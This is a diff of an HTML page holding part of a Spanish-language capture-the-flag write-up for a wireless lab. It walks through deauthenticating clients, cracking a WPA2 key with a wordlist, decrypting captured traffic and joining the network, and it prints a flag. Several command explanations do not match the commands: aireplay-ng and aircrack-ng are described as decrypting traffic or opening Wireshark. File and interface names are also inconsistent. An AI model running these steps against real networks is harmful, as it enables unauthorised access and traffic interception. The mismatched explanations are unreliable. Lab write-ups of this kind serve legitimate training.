@@ -242,11 +242,87 @@ aircrack-ng scan8-01.cap -w /root/rockyou-top100000.txt
 
                     <div class="expandable-card">
                         <div class="card-header" onclick="toggleCard(this)">
+                            <h3>09. What is the IP of the web server in the wifi-mobile network?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>Los comandos utilizados han sido:</p>
+                            <p>
+                                <b>airodump-ng wlan0mon -c 6 --wps -w scan9:</b> Captura/Muestra el trafico de las redes
+                                en el canal 6 y lo guarda en archivos llamados scan8.
+                            </p>
+                            <p>
+                                <b>airdecap-ng -e wifi-mobile -p starwars1 scan9-01.cap:</b> Captura y desencripta el trafico wifi a la vez, utilizando la contraseña y ssid introducido (starwars1,  wifi-mobile)
+                            </p>
+                            <p>
+                                <b>wireshark  scan9-01-dec.cap:</b> Abrimos la captura de trafico con wireshark
+                            </p>
+                            <pre>
+airodump-ng wlan0mon -c 6 --wps -w scan9
+airdecap-ng -e wifi-mobile -p starwars1 scan9-01.cap
+wireshark  scan9-01-dec.cap
+
+En wireshark buscaremos todas las peeticiones que tengan como destino puerto 80, ya que el servidor web se aloja en el puerto 80 de manera habitual.</pre>
+                        </div>
+                    </div>
+
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
+                            <h3>10. what is the flag after login in wifi-mobile?</h3>
+                        </div>
+                        <div class="card-content">
+                            <p>Los comandos utilizados han sido:</p>
+                            <p>
+                                <b>airodump-ng wlan0mon -c 6 --wps -w scan10:</b> Captura/Muestra el trafico de las redes
+                                en el canal 6 y lo guarda en archivos llamados scan8.
+                            </p>
+                            <p>
+                                <b>aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon:</b> Captura y desencripta el trafico wifi a la vez, utilizando la contraseña y ssid introducido (starwars1,  wifi-mobile)
+                            </p>
+                            <p>
+                                <b>aircrack-ng scan10-01.cap -w /root/rockyou-top100000.txt:</b> Abrimos la captura de trafico con wireshark
+                            </p>
+                            <p>
+                                <b>airdecap-ng -e wifi-mobile -p starwars1 scan10-01.cap:</b> Abrimos la captura de trafico con wireshark
+                            </p>
+                            <p>
+                                <b>nano wifi.conf:</b> Para crear un archivo de configuración del wifi, cuyo archivo
+                                contiene
+                            </p>
+                            <pre>
+network={
+    ssid="wifi-mobile"
+    psk="starwars1"
+    key_mgmt=WPA-PSK
+    proto=WPA2
+}</pre>
+                            <p>
+                                <b>wpa_supplicant -Dnl80211 -iwlan4 -c wifi.conf:</b> Para conectarse a la red wifi con
+                                dicha interfaz (wlan1)
+                            </p>
+                            <p><b>dhclient wlan4 -v:</b> Para obtener una IP en dicha interfaz (wlan3)</p>
+                            <p><b>wireshark scan10-01-dec.cap</b></p>
+                            <pre>
+airodump-ng wlan0mon -c 6 --wps -w scan10
+aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon
+aircrack-ng scan10-01.cap -w /root/rockyou-top100000.txt
+airdecap-ng -e wifi-mobile -p starwars1 scan10-01.cap
+nano wifi.conf
+wpa_supplicant -Dnl80211 -iwlan4 -c wifi.conf
+dhclient wlan4 -v
+wireshark  scan9-01-dec.cap
+
+En wireshark buscaremos todas las peeticiones que tengan como destino puerto 80, ya que el servidor web se aloja en el puerto 80 de manera habitual.</pre>
+                        </div>
+                    </div>
+
+                    <div class="expandable-card">
+                        <div class="card-header" onclick="toggleCard(this)">
                             <h3>En progreso...</h3>
                         </div>
                         <div class="card-content">
                             <p>Agradecemos su espera</p>
-                            <pre>flag{60223747c5360c8d3203917998f37d28}</pre>
+                            <pre>flag{60223747c5360c8d3203917998f37d28}</pre
+                            >
                         </div>
                     </div>
 
